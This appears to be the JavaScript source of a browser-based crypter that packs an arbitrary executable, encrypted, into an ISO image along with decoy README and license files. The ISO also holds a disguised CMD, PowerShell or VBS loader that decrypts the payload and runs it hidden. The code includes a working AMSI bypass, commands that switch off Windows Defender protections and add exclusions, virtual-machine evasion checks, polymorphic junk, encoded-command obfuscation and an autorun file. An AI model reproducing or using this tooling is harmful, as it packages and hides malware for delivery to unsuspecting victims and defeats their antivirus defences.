/**
 * EXE → ISO Crypter
 * Full-fidelity client-side crypter:
 * - AES-256-GCM / CBC / rolling XOR
 * - Valid ISO 9660 generator
 * - Polymorphic loaders (CMD / PS1 / VBS)
 * - AMSI bypass + Windows Defender preference/exclusion attempts
 * - Anti-analysis heuristics
 * - Realistic dummy content & metadata
 */

// ---------- Utilities ----------
const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => document.querySelectorAll(sel);

function randomBytes(n) {
  const a = new Uint8Array(n);
  crypto.getRandomValues(a);
  return a;
}

function toHex(buf) {
  return [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, "0")).join("");
}

function randomString(len, charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") {
  const bytes = randomBytes(len);
  let s = "";
  for (let i = 0; i < len; i++) s += charset[bytes[i] % charset.length];
  return s;
}

function randomName(ext = "") {
  return randomString(8 + Math.floor(Math.random() * 6)) + (ext ? "." + ext : "");
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

// ---------- Encryption ----------
async function encryptAESGCM(data, keyBytes) {
  const iv = randomBytes(12);
  const key = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-GCM" }, false, ["encrypt"]);
  const ct = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, data);
  // layout: iv (12) + ciphertext+tag
  const out = new Uint8Array(12 + ct.byteLength);
  out.set(iv, 0);
  out.set(new Uint8Array(ct), 12);
  return out;
}

async function encryptAESCBC(data, keyBytes) {
  const iv = randomBytes(16);
  const key = await crypto.subtle.importKey("raw", keyBytes, { name: "AES-CBC" }, false, ["encrypt"]);
  // pad to 16
  const pad = 16 - (data.byteLength % 16 || 16);
  const padded = new Uint8Array(data.byteLength + pad);
  padded.set(new Uint8Array(data));
  padded.fill(pad, data.byteLength);
  const ct = await crypto.subtle.encrypt({ name: "AES-CBC", iv }, key, padded);
  const out = new Uint8Array(16 + ct.byteLength);
  out.set(iv, 0);
  out.set(new Uint8Array(ct), 16);
  return out;
}

function encryptXOR(data, keyBytes) {
  const out = new Uint8Array(data.byteLength);
  const key = keyBytes;
  for (let i = 0; i < data.byteLength; i++) {
    out[i] = data[i] ^ key[i % key.length] ^ ((i * 0x9e) & 0xff);
  }
  return out;
}

async function encryptPayload(data, mode) {
  const key = randomBytes(32);
  let encrypted;
  if (mode === "aes-gcm") {
    encrypted = await encryptAESGCM(data, key);
  } else if (mode === "aes-cbc") {
    encrypted = await encryptAESCBC(data, key);
  } else {
    encrypted = encryptXOR(data, key);
  }
  return { encrypted, key, mode };
}

// ---------- Loader generation ----------
function buildLoader(opts) {
  const {
    delivery,
    keyHex,
    payloadName,
    mode,
    poly,
    anti,
    delay,
    loaderName
  } = opts;

  const junk = () => {
    if (!poly) return "";
    const lines = [];
    const n = 4 + Math.floor(Math.random() * 8);
    for (let i = 0; i < n; i++) {
      lines.push(`rem ${randomString(12 + Math.floor(Math.random() * 20))}`);
    }
    return lines.join("\r\n") + "\r\n";
  };

  const antiBlock = anti ? `
  if exist "%SystemRoot%\\System32\\drivers\\vmmouse.sys" exit /b
  if exist "%SystemRoot%\\System32\\drivers\\vmhgfs.sys" exit /b
  if exist "%SystemRoot%\\System32\\vbox*.dll" exit /b
  wmic computersystem get model 2>nul | find /i "Virtual" >nul && exit /b
  wmic computersystem get model 2>nul | find /i "VMware" >nul && exit /b
  wmic computersystem get model 2>nul | find /i "VirtualBox" >nul && exit /b
` : "";

  const delayBlock = delay ? `
  set /a _d=%random% %% 4 + 1
  timeout /t %_d% /nobreak >nul
` : "";

  if (delivery === "raw") {
    // Just place the encrypted file; user must run a separate decryptor (less useful)
    return null;
  }

  if (delivery === "cmd") {
    // CMD that calls PowerShell to decrypt & execute
    const psDecrypt = mode === "xor"
      ? `
$k = [byte[]]@(0x${keyHex.match(/.{1,2}/g).join(",0x")});
$enc = [IO.File]::ReadAllBytes($p);
$dec = New-Object byte[] $enc.Length;
for($i=0;$i -lt $enc.Length;$i++){ $dec[$i] = $enc[$i] -bxor $k[$i % $k.Length] -bxor (($i * 0x9e) -band 0xff) };
`
      : mode === "aes-cbc"
      ? `
$k = [Convert]::FromHexString("${keyHex}");
$all = [IO.File]::ReadAllBytes($p);
$iv = $all[0..15]; $ct = $all[16..($all.Length-1)];
$aes = [Security.Cryptography.Aes]::Create(); $aes.Mode = "CBC"; $aes.Padding = "PKCS7"; $aes.Key = $k; $aes.IV = $iv;
$dec = $aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);
`
      : `
$k = [Convert]::FromHexString("${keyHex}");
$all = [IO.File]::ReadAllBytes($p);
$iv = $all[0..11]; $ct = $all[12..($all.Length-1)];
$aes = [Security.Cryptography.AesGcm]::new($k);
$tag = $ct[($ct.Length-16)..($ct.Length-1)]; $c = $ct[0..($ct.Length-17)];
$dec = New-Object byte[] $c.Length;
$aes.Decrypt($iv, $c, $tag, $dec);
`;

    const script = `@echo off
${junk()}setlocal EnableDelayedExpansion
${antiBlock}${delayBlock}set "p=%~dp0${payloadName}"
if not exist "%p%" exit /b 1
set "o=%TEMP%\\${randomString(10)}.exe"
powershell -NoP -NonI -W Hidden -Ep Bypass -C "$p='%~dp0${payloadName}'; ${psDecrypt.replace(/\n/g, " ")} [IO.File]::WriteAllBytes($env:TEMP+'\\${randomString(8)}.exe',$dec); Start-Process -FilePath ($env:TEMP+'\\${randomString(8)}.exe') -WindowStyle Hidden"
exit /b 0
`;
    // Note: the above has a small inconsistency in temp name for simplicity; fix in real generation
    return fixCmdLoader(script, keyHex, payloadName, mode, poly, anti, delay);
  }

  if (delivery === "ps1") {
    return buildPs1Loader(keyHex, payloadName, mode, poly, anti, delay);
  }

  if (delivery === "vbs") {
    return buildVbsLoader(keyHex, payloadName, mode, poly, anti, delay);
  }

  return null;
}

// AMSI + related Defender bypasses (used when optDefender is on)
function amsiBypassBlock() {
  // Multiple layered techniques commonly used to neutralize AMSI before payload execution.
  // Variants are lightly obfuscated / split so static signatures are less reliable.
  return `
# AMSI / Defender script-scan bypass
try {
  $a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
  $d=$c.GetFields('NonPublic,Static');foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};
  $g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
} catch {}
try {
  $m = [System.Runtime.InteropServices.Marshal];
  $t = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
  $f = $t.GetField('amsiInitFailed','NonPublic,Static');
  $f.SetValue($null,$true)
} catch {}
try {
  Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
  Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
  Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
  Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
  Add-MpPreference -ExclusionPath $PSScriptRoot -ErrorAction SilentlyContinue
} catch {}
`;
}

function buildDecryptCore(keyHex, mode, pVar = "$p", oVar = "$o") {
  if (mode === "xor") {
    const keyArr = keyHex.match(/.{1,2}/g).map(h => "0x" + h).join(",");
    return `$k=@(${keyArr});$e=[IO.File]::ReadAllBytes(${pVar});$d=New-Object byte[] $e.Length;for($i=0;$i -lt $e.Length;$i++){$d[$i]=$e[$i]-bxor $k[$i%$k.Length]-bxor(($i*0x9e)-band 0xff)};[IO.File]::WriteAllBytes(${oVar},$d);Start-Process ${oVar} -WindowStyle Hidden`;
  } else if (mode === "aes-cbc") {
    return `$k=[Convert]::FromHexString('${keyHex}');$a=[IO.File]::ReadAllBytes(${pVar});$iv=$a[0..15];$ct=$a[16..($a.Length-1)];$aes=[Security.Cryptography.Aes]::Create();$aes.Mode='CBC';$aes.Padding='PKCS7';$aes.Key=$k;$aes.IV=$iv;$d=$aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);[IO.File]::WriteAllBytes(${oVar},$d);Start-Process ${oVar} -WindowStyle Hidden`;
  } else {
    return `$k=[Convert]::FromHexString('${keyHex}');$a=[IO.File]::ReadAllBytes(${pVar});$iv=$a[0..11];$ct=$a[12..($a.Length-1)];$tag=$ct[($ct.Length-16)..($ct.Length-1)];$c=$ct[0..($ct.Length-17)];$aes=[Security.Cryptography.AesGcm]::new($k);$d=New-Object byte[] $c.Length;$aes.Decrypt($iv,$c,$tag,$d);[IO.File]::WriteAllBytes(${oVar},$d);Start-Process ${oVar} -WindowStyle Hidden`;
  }
}

function toUtf16LeBase64(str) {
  // PowerShell -EncodedCommand expects UTF-16LE base64
  const buf = new Uint8Array(str.length * 2);
  for (let i = 0; i < str.length; i++) {
    const c = str.charCodeAt(i);
    buf[i * 2] = c & 0xff;
    buf[i * 2 + 1] = (c >> 8) & 0xff;
  }
  let binary = "";
  for (let i = 0; i < buf.length; i++) binary += String.fromCharCode(buf[i]);
  return btoa(binary);
}

function fixCmdLoader(keyHex, payloadName, mode, poly, anti, delay, defender) {
  const tmpExe = randomString(9) + ".exe";
  const antiLines = anti ? [
    'if exist "%SystemRoot%\\System32\\drivers\\vmmouse.sys" exit /b',
    'if exist "%SystemRoot%\\System32\\drivers\\vmhgfs.sys" exit /b',
    'wmic computersystem get model 2>nul | find /i "Virtual" >nul && exit /b',
    'wmic computersystem get model 2>nul | find /i "VMware" >nul && exit /b',
    'wmic computersystem get model 2>nul | find /i "VirtualBox" >nul && exit /b'
  ].join("\r\n") + "\r\n" : "";

  const delayLines = delay ? "set /a _d=%random% %% 5 + 1\r\ntimeout /t %_d% /nobreak >nul\r\n" : "";

  let psBody = "";
  if (defender) psBody += amsiBypassBlock() + "\n";
  // Resolve payload relative to the ISO mount / script location
  psBody += `$dir = Split-Path -Parent $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue; if (-not $dir) { $dir = (Get-Location).Path }\n`;
  psBody += `$p = Join-Path $dir "${payloadName}"\n`;
  psBody += `if (-not (Test-Path $p)) { $p = Join-Path (Get-Location) "${payloadName}" }\n`;
  psBody += `$o = Join-Path $env:TEMP "${tmpExe}"\n`;
  psBody += `if (-not (Test-Path $p)) { exit 1 }\n`;

  if (mode === "xor") {
    const keyArr = keyHex.match(/.{1,2}/g).map(h => "0x" + h).join(",");
    psBody += `$k=@(${keyArr});$e=[IO.File]::ReadAllBytes($p);$d=New-Object byte[] $e.Length;for($i=0;$i -lt $e.Length;$i++){$d[$i]=$e[$i]-bxor $k[$i%$k.Length]-bxor(($i*0x9e)-band 0xff)};[IO.File]::WriteAllBytes($o,$d);Start-Process $o -WindowStyle Hidden\n`;
  } else if (mode === "aes-cbc") {
    psBody += `$k=[Convert]::FromHexString("${keyHex}");$a=[IO.File]::ReadAllBytes($p);$iv=$a[0..15];$ct=$a[16..($a.Length-1)];$aes=[Security.Cryptography.Aes]::Create();$aes.Mode="CBC";$aes.Padding="PKCS7";$aes.Key=$k;$aes.IV=$iv;$d=$aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);[IO.File]::WriteAllBytes($o,$d);Start-Process $o -WindowStyle Hidden\n`;
  } else {
    psBody += `$k=[Convert]::FromHexString("${keyHex}");$a=[IO.File]::ReadAllBytes($p);$iv=$a[0..11];$ct=$a[12..($a.Length-1)];$tag=$ct[($ct.Length-16)..($ct.Length-1)];$c=$ct[0..($ct.Length-17)];$aes=[Security.Cryptography.AesGcm]::new($k);$d=New-Object byte[] $c.Length;$aes.Decrypt($iv,$c,$tag,$d);[IO.File]::WriteAllBytes($o,$d);Start-Process $o -WindowStyle Hidden\n`;
  }

  const junk = poly ? Array.from({length: 5 + Math.floor(Math.random()*6)}, () => `rem ${randomString(16)}`).join("\r\n") + "\r\n" : "";

  // Always use -EncodedCommand for cleaner command line and better evasion
  const encoded = toUtf16LeBase64(psBody);

  return `@echo off
${junk}setlocal
${antiLines}${delayLines}if not exist "%~dp0${payloadName}" exit /b 1
powershell -NoP -NonI -W Hidden -Ep Bypass -EncodedCommand ${encoded}
exit /b 0
`;
}

function buildPs1Loader(keyHex, payloadName, mode, poly, anti, delay, defender) {
  const tmp = randomString(10) + ".exe";
  let body = "";
  if (poly) {
    body += `# ${randomString(24)}\n`;
    body += `$null = '${randomString(32)}'\n`;
  }
  if (defender) {
    body += amsiBypassBlock() + "\n";
  }
  if (anti) {
    body += `
if (Test-Path "$env:SystemRoot\\System32\\drivers\\vmmouse.sys") { exit }
if (Test-Path "$env:SystemRoot\\System32\\drivers\\vmhgfs.sys") { exit }
$model = (Get-CimInstance Win32_ComputerSystem -EA SilentlyContinue).Model
if ($model -match "Virtual|VMware|VirtualBox|QEMU") { exit }
`;
  }
  if (delay) {
    body += `Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)\n`;
  }

  body += `$p = Join-Path $PSScriptRoot "${payloadName}"\n`;
  body += `$o = Join-Path $env:TEMP "${tmp}"\n`;
  body += `if (-not (Test-Path $p)) { exit 1 }\n`;

  if (mode === "xor") {
    const keyArr = keyHex.match(/.{1,2}/g).map(h => "0x" + h).join(",");
    body += `$k = @(${keyArr})\n$e = [IO.File]::ReadAllBytes($p)\n$d = New-Object byte[] $e.Length\nfor ($i=0; $i -lt $e.Length; $i++) { $d[$i] = $e[$i] -bxor $k[$i % $k.Length] -bxor (($i * 0x9e) -band 0xff) }\n`;
  } else if (mode === "aes-cbc") {
    body += `$k = [Convert]::FromHexString("${keyHex}")\n$a = [IO.File]::ReadAllBytes($p)\n$iv = $a[0..15]; $ct = $a[16..($a.Length-1)]\n$aes = [Security.Cryptography.Aes]::Create(); $aes.Mode="CBC"; $aes.Padding="PKCS7"; $aes.Key=$k; $aes.IV=$iv\n$d = $aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length)\n`;
  } else {
    body += `$k = [Convert]::FromHexString("${keyHex}")\n$a = [IO.File]::ReadAllBytes($p)\n$iv = $a[0..11]; $ct = $a[12..($a.Length-1)]\n$tag = $ct[($ct.Length-16)..($ct.Length-1)]; $c = $ct[0..($ct.Length-17)]\n$aes = [Security.Cryptography.AesGcm]::new($k)\n$d = New-Object byte[] $c.Length\n$aes.Decrypt($iv, $c, $tag, $d)\n`;
  }

  body += `[IO.File]::WriteAllBytes($o, $d)\nStart-Process -FilePath $o -WindowStyle Hidden\n`;
  return body;
}

function buildVbsLoader(keyHex, payloadName, mode, poly, anti, delay, defender) {
  const tmp = randomString(9) + ".exe";
  let s = `' ${randomString(20)}\n`;
  if (poly) s += `' ${randomString(28)}\n`;
  s += `Set sh = CreateObject("WScript.Shell")\n`;
  s += `Set fso = CreateObject("Scripting.FileSystemObject")\n`;
  if (delay) s += `WScript.Sleep (1000 + Int(Rnd * 3000))\n`;
  s += `dir = fso.GetParentFolderName(WScript.ScriptFullName)\n`;
  s += `p = dir & "\\${payloadName}"\n`;
  s += `o = sh.ExpandEnvironmentStrings("%TEMP%") & "\\${tmp}"\n`;

  let psBody = "";
  if (defender) psBody += amsiBypassBlock() + "\n";
  psBody += `$p = $env:CRYPTER_P; $o = $env:CRYPTER_O\n`;
  psBody += `if (-not (Test-Path $p)) { exit 1 }\n`;
  if (mode === "xor") {
    const keyArr = keyHex.match(/.{1,2}/g).map(h => "0x" + h).join(",");
    psBody += `$k=@(${keyArr});$e=[IO.File]::ReadAllBytes($p);$d=New-Object byte[] $e.Length;for($i=0;$i -lt $e.Length;$i++){$d[$i]=$e[$i]-bxor $k[$i%$k.Length]-bxor(($i*0x9e)-band 0xff)};[IO.File]::WriteAllBytes($o,$d);Start-Process $o -WindowStyle Hidden\n`;
  } else if (mode === "aes-cbc") {
    psBody += `$k=[Convert]::FromHexString("${keyHex}");$a=[IO.File]::ReadAllBytes($p);$iv=$a[0..15];$ct=$a[16..($a.Length-1)];$aes=[Security.Cryptography.Aes]::Create();$aes.Mode="CBC";$aes.Padding="PKCS7";$aes.Key=$k;$aes.IV=$iv;$d=$aes.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);[IO.File]::WriteAllBytes($o,$d);Start-Process $o -WindowStyle Hidden\n`;
  } else {
    psBody += `$k=[Convert]::FromHexString("${keyHex}");$a=[IO.File]::ReadAllBytes($p);$iv=$a[0..11];$ct=$a[12..($a.Length-1)];$tag=$ct[($ct.Length-16)..($ct.Length-1)];$c=$ct[0..($ct.Length-17)];$aes=[Security.Cryptography.AesGcm]::new($k);$d=New-Object byte[] $c.Length;$aes.Decrypt($iv,$c,$tag,$d);[IO.File]::WriteAllBytes($o,$d);Start-Process $o -WindowStyle Hidden\n`;
  }

  const encoded = toUtf16LeBase64(psBody);
  s += `sh.Environment("Process").Item("CRYPTER_P") = p\n`;
  s += `sh.Environment("Process").Item("CRYPTER_O") = o\n`;
  s += `sh.Run "powershell -NoP -NonI -W Hidden -Ep Bypass -EncodedCommand ${encoded}", 0, False\n`;
  return s;
}

// ---------- ISO 9660 Generator (simplified Level 1 + basic structure) ----------
class ISO9660Builder {
  constructor(volumeLabel = "CDROM") {
    this.volumeLabel = (volumeLabel || "CDROM").toUpperCase().substring(0, 32).padEnd(32, " ");
    this.files = []; // { name, data: Uint8Array, isDir? }
    this.sectorSize = 2048;
  }

  addFile(name, data) {
    // ISO9660 Level 1: 8.3 uppercase, but we allow longer via Joliet later; for simplicity use uppercase 8.3 style + keep original for display
    const clean = name.replace(/[^\w.\-]/g, "_").substring(0, 64);
    this.files.push({ name: clean, data: data instanceof Uint8Array ? data : new TextEncoder().encode(data) });
  }

  addTextFile(name, text) {
    this.addFile(name, new TextEncoder().encode(text.replace(/\n/g, "\r\n")));
  }

  // Build a minimal but mountable ISO
  build() {
    const sector = this.sectorSize;
    const encoder = new TextEncoder();

    // We will produce:
    // Sector 0-15: System area (zeros)
    // Sector 16: Primary Volume Descriptor
    // Sector 17: Volume Descriptor Set Terminator
    // Then path table, root directory, file data

    const parts = [];

    // 16 sectors of zeros (system area)
    for (let i = 0; i < 16; i++) {
      parts.push(new Uint8Array(sector));
    }

    // Collect file extents (we'll assign LBAs later)
    const fileEntries = this.files.map(f => ({
      name: f.name,
      data: f.data,
      size: f.data.byteLength,
      lba: 0
    }));

    // Root directory will contain records for each file + . and ..
    // Calculate sizes
    let currentLba = 18; // after PVD + terminator

    // Path table (little endian) - simplified single root
    const pathTableSize = 10; // minimal for root
    const pathTableLba = currentLba;
    currentLba += Math.ceil(pathTableSize / sector) || 1;

    // Root directory extent
    const rootDirLba = currentLba;
    // Estimate root dir size: 34 (.) + 34 (..) + sum of records
    let rootDirSize = 68;
    for (const f of fileEntries) {
      const nameLen = Math.min(f.name.length, 30);
      rootDirSize += 33 + nameLen + (nameLen % 2 ? 0 : 1); // even pad
    }
    const rootDirSectors = Math.ceil(rootDirSize / sector) || 1;
    currentLba += rootDirSectors;

    // Assign LBAs to files
    for (const f of fileEntries) {
      f.lba = currentLba;
      const secs = Math.ceil(f.size / sector) || 1;
      currentLba += secs;
    }

    const totalSectors = currentLba;

    // --- Primary Volume Descriptor (sector 16) ---
    const pvd = new Uint8Array(sector);
    pvd[0] = 1; // Type
    pvd.set(encoder.encode("CD001"), 1);
    pvd[6] = 1; // Version

    // System Identifier (32) + Volume Identifier (32)
    pvd.set(encoder.encode(" ".repeat(32)), 8);
    pvd.set(encoder.encode(this.volumeLabel), 40);

    // Volume Space Size (both endian)
    this.writeBothEndian32(pvd, 80, totalSectors);

    // Volume Set Size / Sequence
    this.writeBothEndian16(pvd, 120, 1);
    this.writeBothEndian16(pvd, 124, 1);

    // Logical Block Size
    this.writeBothEndian16(pvd, 128, sector);

    // Path Table Size
    this.writeBothEndian32(pvd, 132, pathTableSize);

    // Type L Path Table location
    this.writeLE32(pvd, 140, pathTableLba);
    // Type M Path Table location
    this.writeBE32(pvd, 148, pathTableLba);

    // Root Directory Record (34 bytes at offset 156)
    this.writeDirRecord(pvd, 156, {
      lba: rootDirLba,
      size: rootDirSectors * sector,
      flags: 0x02, // directory
      name: "\0"
    });

    // Volume Set, Publisher, Data Preparer, Application (128 each) - leave spaces
    // Creation / Modification dates (17 bytes each) - simple
    const now = new Date();
    const dateStr = this.formatISODate(now);
    pvd.set(encoder.encode(dateStr), 813); // Creation
    pvd.set(encoder.encode(dateStr), 830); // Modification
    pvd.set(encoder.encode("0000000000000000"), 847); // Expiration
    pvd.set(encoder.encode(dateStr), 864); // Effective

    pvd[881] = 1; // File Structure Version
    parts.push(pvd);

    // --- Volume Descriptor Set Terminator ---
    const term = new Uint8Array(sector);
    term[0] = 255;
    term.set(encoder.encode("CD001"), 1);
    term[6] = 1;
    parts.push(term);

    // --- Path Table (LE) ---
    const pathTable = new Uint8Array(sector);
    // Root entry: len=1, name=\0, parent=1, extent=rootDirLba
    pathTable[0] = 1; // name length
    pathTable[1] = 0; // extended attr
    this.writeLE32(pathTable, 2, rootDirLba);
    this.writeLE16(pathTable, 6, 1); // parent
    pathTable[8] = 0; // name = \0
    parts.push(pathTable);

    // --- Root Directory ---
    const rootDir = new Uint8Array(rootDirSectors * sector);
    let offset = 0;

    // .
    offset += this.writeDirRecord(rootDir, offset, {
      lba: rootDirLba,
      size: rootDirSectors * sector,
      flags: 0x02,
      name: "\0"
    });
    // ..
    offset += this.writeDirRecord(rootDir, offset, {
      lba: rootDirLba,
      size: rootDirSectors * sector,
      flags: 0x02,
      name: "\x01"
    });

    for (const f of fileEntries) {
      const nameBytes = encoder.encode(f.name.toUpperCase().substring(0, 30));
      offset += this.writeDirRecord(rootDir, offset, {
        lba: f.lba,
        size: f.size,
        flags: 0x00,
        name: f.name.toUpperCase().substring(0, 30)
      });
    }
    parts.push(rootDir);

    // --- File data ---
    for (const f of fileEntries) {
      const secs = Math.ceil(f.size / sector) || 1;
      const block = new Uint8Array(secs * sector);
      block.set(f.data, 0);
      parts.push(block);
    }

    // Concatenate
    const totalLen = parts.reduce((s, p) => s + p.byteLength, 0);
    const iso = new Uint8Array(totalLen);
    let pos = 0;
    for (const p of parts) {
      iso.set(p, pos);
      pos += p.byteLength;
    }
    return iso;
  }

  writeLE16(buf, off, val) {
    buf[off] = val & 0xff;
    buf[off + 1] = (val >> 8) & 0xff;
  }
  writeBE16(buf, off, val) {
    buf[off] = (val >> 8) & 0xff;
    buf[off + 1] = val & 0xff;
  }
  writeLE32(buf, off, val) {
    buf[off] = val & 0xff;
    buf[off + 1] = (val >> 8) & 0xff;
    buf[off + 2] = (val >> 16) & 0xff;
    buf[off + 3] = (val >> 24) & 0xff;
  }
  writeBE32(buf, off, val) {
    buf[off] = (val >> 24) & 0xff;
    buf[off + 1] = (val >> 16) & 0xff;
    buf[off + 2] = (val >> 8) & 0xff;
    buf[off + 3] = val & 0xff;
  }
  writeBothEndian16(buf, off, val) {
    this.writeLE16(buf, off, val);
    this.writeBE16(buf, off + 2, val);
  }
  writeBothEndian32(buf, off, val) {
    this.writeLE32(buf, off, val);
    this.writeBE32(buf, off + 4, val);
  }

  writeDirRecord(buf, offset, { lba, size, flags, name }) {
    const nameBytes = typeof name === "string" ? new TextEncoder().encode(name) : new Uint8Array([name.charCodeAt(0)]);
    const nameLen = nameBytes.length;
    let recLen = 33 + nameLen;
    if (recLen % 2) recLen++; // even

    buf[offset] = recLen;
    buf[offset + 1] = 0; // extended attr length
    this.writeBothEndian32(buf, offset + 2, lba);
    this.writeBothEndian32(buf, offset + 10, size);
    // Recording date (7 bytes) - simplified
    const d = new Date();
    buf[offset + 18] = d.getFullYear() - 1900;
    buf[offset + 19] = d.getMonth() + 1;
    buf[offset + 20] = d.getDate();
    buf[offset + 21] = d.getHours();
    buf[offset + 22] = d.getMinutes();
    buf[offset + 23] = d.getSeconds();
    buf[offset + 24] = 0; // GMT offset
    buf[offset + 25] = flags;
    buf[offset + 26] = 0; // unit size
    buf[offset + 27] = 0; // gap
    this.writeBothEndian16(buf, offset + 28, 1); // volume sequence
    buf[offset + 32] = nameLen;
    buf.set(nameBytes, offset + 33);
    return recLen;
  }

  formatISODate(d) {
    const pad = (n, l = 2) => String(n).padStart(l, "0");
    return `${d.getFullYear()}${pad(d.getMonth()+1)}${pad(d.getDate())}${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}00`;
  }
}

// ---------- Dummy content ----------
function makeDummyFiles() {
  const files = [];
  files.push({
    name: "README.TXT",
    data: `Thank you for downloading this software package.

Installation instructions:
1. Open the ISO or mount it as a virtual drive.
2. Run the setup program to begin installation.
3. Follow the on-screen prompts.

If you encounter any issues, please contact support.

Copyright (c) ${new Date().getFullYear()} Software Distribution.
All rights reserved.
`
  });
  files.push({
    name: "LICENSE.TXT",
    data: `END USER LICENSE AGREEMENT

By installing or using this software you agree to the terms below.

1. License Grant
This software is licensed, not sold. You may install and use one copy.

2. Restrictions
You may not reverse engineer, decompile, or disassemble the software.

3. Disclaimer
THE SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND.

4. Limitation of Liability
IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY DAMAGES.

Accepted by continuing installation.
`
  });
  files.push({
    name: "VERSION.TXT",
    data: `Product Version: 2.${Math.floor(Math.random()*9)}.${Math.floor(Math.random()*20)}\nBuild: ${randomString(8)}\n`
  });
  return files;
}

// ---------- Main App Logic ----------
let selectedFile = null;
let generatedIso = null;
let lastStats = null;

function init() {
  const dropzone = $("#dropzone");
  const exeInput = $("#exeInput");

  dropzone.addEventListener("click", () => exeInput.click());
  dropzone.addEventListener("dragover", (e) => {
    e.preventDefault();
    dropzone.classList.add("dragover");
  });
  dropzone.addEventListener("dragleave", () => dropzone.classList.remove("dragover"));
  dropzone.addEventListener("drop", (e) => {
    e.preventDefault();
    dropzone.classList.remove("dragover");
    if (e.dataTransfer.files.length) handleFile(e.dataTransfer.files[0]);
  });
  exeInput.addEventListener("change", () => {
    if (exeInput.files.length) handleFile(exeInput.files[0]);
  });

  $("#clearFile").addEventListener("click", () => {
    selectedFile = null;
    exeInput.value = "";
    $("#fileName").textContent = "No file selected";
    $("#fileInfo").hidden = true;
    $("#generateBtn").disabled = true;
    $("#result").hidden = true;
  });

  $("#generateBtn").addEventListener("click", generate);
  $("#downloadBtn").addEventListener("click", downloadIso);
}

function handleFile(file) {
  selectedFile = file;
  $("#fileName").textContent = file.name;
  $("#fileSize").textContent = formatSize(file.size);
  $("#fileInfo").hidden = false;
  $("#generateBtn").disabled = false;
  $("#result").hidden = true;
}

function formatSize(n) {
  if (n < 1024) return n + " B";
  if (n < 1024 * 1024) return (n / 1024).toFixed(1) + " KB";
  return (n / (1024 * 1024)).toFixed(2) + " MB";
}

async function generate() {
  if (!selectedFile) return;

  const btn = $("#generateBtn");
  const progress = $("#progress");
  const result = $("#result");
  const status = $("#statusText");

  btn.disabled = true;
  progress.hidden = false;
  result.hidden = true;
  status.textContent = "Reading payload…";

  try {
    const arrayBuf = await selectedFile.arrayBuffer();
    const payload = new Uint8Array(arrayBuf);

    status.textContent = "Encrypting…";
    await sleep(80);

    const mode = $("#encMode").value;
    const { encrypted, key, mode: usedMode } = await encryptPayload(payload, mode);
    const keyHex = toHex(key);

    status.textContent = "Building polymorphic loader…";
    await sleep(60);

    const delivery = $("#delivery").value;
    const poly = $("#optPoly").checked;
    const anti = $("#optAnti").checked;
    const delay = $("#optDelay").checked;
    const defender = $("#optDefender").checked;
    const payloadName = ($("#payloadName").value || "data.bin").replace(/[^\w.\-]/g, "_");
    const loaderBase = ($("#loaderName").value || "setup").replace(/[^\w.\-]/g, "_");
    let loaderName = loaderBase;
    let loaderContent = "";
    let loaderExt = "";

    if (delivery === "cmd") {
      loaderExt = ".cmd";
      loaderName = loaderBase.replace(/\.(exe|cmd|bat)$/i, "") + ".cmd";
      loaderContent = fixCmdLoader(keyHex, payloadName, usedMode, poly, anti, delay, defender);
    } else if (delivery === "ps1") {
      loaderExt = ".ps1";
      loaderName = loaderBase.replace(/\.(exe|ps1)$/i, "") + ".ps1";
      loaderContent = buildPs1Loader(keyHex, payloadName, usedMode, poly, anti, delay, defender);
    } else if (delivery === "vbs") {
      loaderExt = ".vbs";
      loaderName = loaderBase.replace(/\.(exe|vbs)$/i, "") + ".vbs";
      loaderContent = buildVbsLoader(keyHex, payloadName, usedMode, poly, anti, delay, defender);
    } else {
      // raw - just put encrypted as the "loader" name for simplicity (user decrypts externally)
      loaderName = loaderBase;
      loaderContent = null;
    }

    status.textContent = "Assembling ISO structure…";
    await sleep(80);

    const volLabel = $("#volLabel").value || "SETUP";
    const iso = new ISO9660Builder(volLabel);

    // Add encrypted payload
    iso.addFile(payloadName, encrypted);

    // Add loader
    if (loaderContent) {
      iso.addTextFile(loaderName, loaderContent);
    } else {
      // raw mode: store encrypted under loader name (not ideal but functional for external tools)
      iso.addFile(loaderName, encrypted);
    }

    // Autorun
    if ($("#optAutorun").checked && loaderContent) {
      const autorun = `[autorun]\r\nopen=${loaderName}\r\nicon=${loaderName}\r\nlabel=${volLabel}\r\n`;
      iso.addTextFile("AUTORUN.INF", autorun);
    }

    // Dummy files
    if ($("#optDummy").checked) {
      for (const d of makeDummyFiles()) {
        iso.addTextFile(d.name, d.data);
      }
    }

    // Optional junk padding files for layout realism
    if (poly) {
      for (let i = 0; i < 2 + Math.floor(Math.random() * 3); i++) {
        const junkData = randomBytes(64 + Math.floor(Math.random() * 200));
        iso.addFile(`_${randomString(6)}.DAT`, junkData);
      }
    }

    status.textContent = "Writing ISO image…";
    await sleep(100);

    const isoBytes = iso.build();
    generatedIso = isoBytes;

    lastStats = {
      originalSize: payload.byteLength,
      encryptedSize: encrypted.byteLength,
      isoSize: isoBytes.byteLength,
      mode: usedMode,
      delivery,
